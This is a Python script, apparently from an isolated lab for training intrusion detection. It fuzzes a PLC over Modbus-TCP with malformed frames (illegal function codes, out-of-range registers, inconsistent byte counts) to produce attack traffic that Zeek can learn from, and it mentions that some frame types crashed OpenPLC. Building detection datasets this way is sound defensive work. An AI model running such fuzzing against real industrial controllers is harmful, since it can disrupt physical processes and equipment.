#!/usr/bin/env python3
"""
Malformed / illegal Modbus-TCP frame injection.

Sends deliberately broken Modbus Application Data Units (ADUs) straight over a
raw TCP socket to port 502 -- bypassing pymodbus so we control every byte. The
goal is to exercise the PLC's protocol error handling and to produce traffic
that a benign SCADA client would never emit: illegal function codes, header
length mismatches, truncated PDUs, and out-of-range address/quantity fields.

These frames tend to elicit Modbus exception responses (or connection resets),
so Zeek sees elevated exception counts and unusual function codes -- the flow
signature of a malformed-traffic / fuzzing attack.

For ISOLATED lab use only (see SECURITY.md).

Usage (inside the attacker container):
    python3 modbus_malformed.py [host] [port] [count]
    default host=openplc port=502 count=40
"""
import sys, socket, struct, random

HOST = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502
COUNT = int(sys.argv[3]) if len(sys.argv) > 3 else 40


def mbap(tid, pdu, length=None):
    """Build a Modbus/TCP frame. length=None -> correct; else forced (mismatch)."""
    unit = 1
    if length is None:
        length = len(pdu) + 1  # unit id + pdu
    return struct.pack(">HHHB", tid, 0, length, unit) + pdu


def frames(tid):
    """Yield a variety of malformed but well-FRAMED ADUs.

    These use a correct MBAP length so they don't desync the TCP stream or crash
    a simple server's framer; they are illegal at the Modbus *application* layer
    (bad function codes, out-of-range address/quantity, inconsistent byte count),
    which elicits exception responses -- the signature we want to learn -- while
    keeping the PLC alive. (Earlier truncated / length-mismatch frames were
    dropped because they crashed OpenPLC's Modbus runtime.)
    """
    # 1. illegal function code (0x66 is not a defined Modbus function)
    yield mbap(tid, struct.pack(">B", 0x66) + b"\x00\x00\x00\x01")
    # 2. reserved/rare function code with a small valid-length payload
    yield mbap(tid, struct.pack(">B", random.choice([0x07, 0x2B, 0x5A])) + b"\xde\xad\xbe\xef")
    # 3. illegal data address + illegal quantity (0xFFFF regs at 0xFFFF)
    yield mbap(tid, struct.pack(">BHH", 0x03, 0xFFFF, 0xFFFF))
    # 4. read with an out-of-range quantity (> 125 registers)
    yield mbap(tid, struct.pack(">BHH", 0x03, 0x0000, 0x0200))
    # 5. write-multiple with a byte-count that doesn't match the data (semantic)
    yield mbap(tid, struct.pack(">BHHB", 0x10, 0x0000, 0x0002, 0x0A) + b"\x00\x01\x00\x02")


sent = 0
print(f"[*] sending malformed Modbus frames to {HOST}:{PORT}")
for i in range(COUNT):
    try:
        s = socket.create_connection((HOST, PORT), timeout=1)
        for pdu in frames(i + 1):
            try:
                s.sendall(pdu)
                s.settimeout(0.4)
                try:
                    s.recv(256)  # drain any exception response
                except socket.timeout:
                    pass
                sent += 1
            except OSError:
                break
        s.close()
    except OSError:
        pass

print(f"[*] done -- {sent} malformed frame(s) sent.")
